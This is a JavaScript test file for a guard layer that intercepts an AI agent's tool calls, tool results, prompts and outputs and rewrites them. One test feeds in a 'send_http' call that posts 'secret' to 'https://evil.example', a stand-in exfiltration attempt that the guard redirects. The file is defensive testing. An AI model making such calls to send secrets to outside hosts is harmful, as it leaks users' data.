"use strict";

const assert = require("node:assert/strict");
const test = require("node:test");

const { AgentGuardOpenClawBridge } = require("./bridge.cjs");
const {
  BasePlugin,
  CheckResult,
  EventType,
  GuardDecision,
} = require("./agentguard-runtime.cjs");

function buildPhases(overrides = {}) {
  return {
    llm_before: { client: [], server: [] },
    llm_after: { client: [], server: [] },
    tool_before: { client: [], server: [] },
    tool_after: { client: [], server: [] },
    ...overrides,
  };
}

function buildToolContext(overrides = {}) {
  return {
    agentId: "agent-main",
    sessionId: "session-1",
    sessionKey: "agent:main:session-1",
    runId: "run-1",
    toolCallId: "tool-call-1",
    channelId: "cli",
    ...overrides,
  };
}

function buildAgentContext(overrides = {}) {
  return {
    agentId: "agent-main",
    sessionId: "session-1",
    sessionKey: "agent:main:session-1",
    runId: "run-1",
    channelId: "cli",
    ...overrides,
  };
}

test("openclaw before_tool_call returns modified params from processed_content", async () => {
  class ModifyToolInvokePlugin extends BasePlugin {
    constructor() {
      super();
      this.event_types = [EventType.TOOL_INVOKE];
    }

    check() {
      return new CheckResult({
        decision_candidate: GuardDecision.modify_tool_invoke("rewrite tool args", {
          processed_content: JSON.stringify({
            params: { url: "https://safe.example", body: "[clean]" },
          }),
        }),
        is_final: true,
      });
    }
  }

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases({
        tool_before: { client: [ModifyToolInvokePlugin], server: [] },
      }),
    },
  });

  const result = await bridge.runBeforeToolCall({
    ctx: buildToolContext(),
    event: {
      toolName: "send_http",
      params: { url: "https://evil.example", body: "secret" },
    },
  });

  assert.deepEqual(result, {
    params: { url: "https://safe.example", body: "[clean]" },
  });
});

test("openclaw after_tool_call returns modified result from processed_content", async () => {
  class ModifyToolResultPlugin extends BasePlugin {
    constructor() {
      super();
      this.event_types = [EventType.TOOL_RESULT];
    }

    check() {
      return new CheckResult({
        decision_candidate: GuardDecision.modify_tool_result("rewrite tool result", {
          processed_content: JSON.stringify({
            result: { content: [{ type: "text", text: "safe content" }] },
          }),
        }),
        is_final: true,
      });
    }
  }

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases({
        tool_after: { client: [ModifyToolResultPlugin], server: [] },
      }),
    },
  });

  const result = await bridge.runAfterToolCall({
    ctx: buildToolContext(),
    event: {
      toolName: "read_file",
      result: { content: [{ type: "text", text: "raw content" }] },
    },
  });

  assert.deepEqual(result, {
    result: { content: [{ type: "text", text: "safe content" }] },
  });
});

test("openclaw before_agent_start returns modified llm input", async () => {
  class ModifyPromptPlugin extends BasePlugin {
    constructor() {
      super();
      this.event_types = [EventType.LLM_INPUT];
    }

    check() {
      return new CheckResult({
        decision_candidate: GuardDecision.modify_llm_input("rewrite prompt", {
          processed_content: JSON.stringify({
            messages: [
              { role: "system", content: "You are safe." },
              { role: "user", content: "rewritten prompt" },
            ],
          }),
        }),
        is_final: true,
      });
    }
  }

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases({
        llm_before: { client: [ModifyPromptPlugin], server: [] },
      }),
    },
  });

  const result = await bridge.runBeforeAgentRun({
    ctx: buildAgentContext(),
    event: {
      systemPrompt: "original system",
      prompt: "original prompt",
    },
  });

  assert.deepEqual(result, {
    messages: [
      { role: "system", content: "You are safe." },
      { role: "user", content: "rewritten prompt" },
    ],
  });
});

test("openclaw message_sending returns modified llm output", async () => {
  class ModifyOutputPlugin extends BasePlugin {
    constructor() {
      super();
      this.event_types = [EventType.LLM_OUTPUT];
    }

    check() {
      return new CheckResult({
        decision_candidate: GuardDecision.modify_llm_output("rewrite output", {
          processed_content: JSON.stringify({ output: "safe answer" }),
        }),
        is_final: true,
      });
    }
  }

  const bridge = new AgentGuardOpenClawBridge({
    pluginConfig: {
      phases: buildPhases({
        llm_after: { client: [ModifyOutputPlugin], server: [] },
      }),
    },
  });

  const result = await bridge.runMessageSending({
    ctx: buildAgentContext({ agentId: undefined, sessionId: undefined }),
    event: {
      to: "stdout",
      content: "raw answer",
    },
  });

  assert.equal(result.content, "safe answer");
  assert.equal(result.metadata.agentguard.decisionType, "modify_llm_output");
});
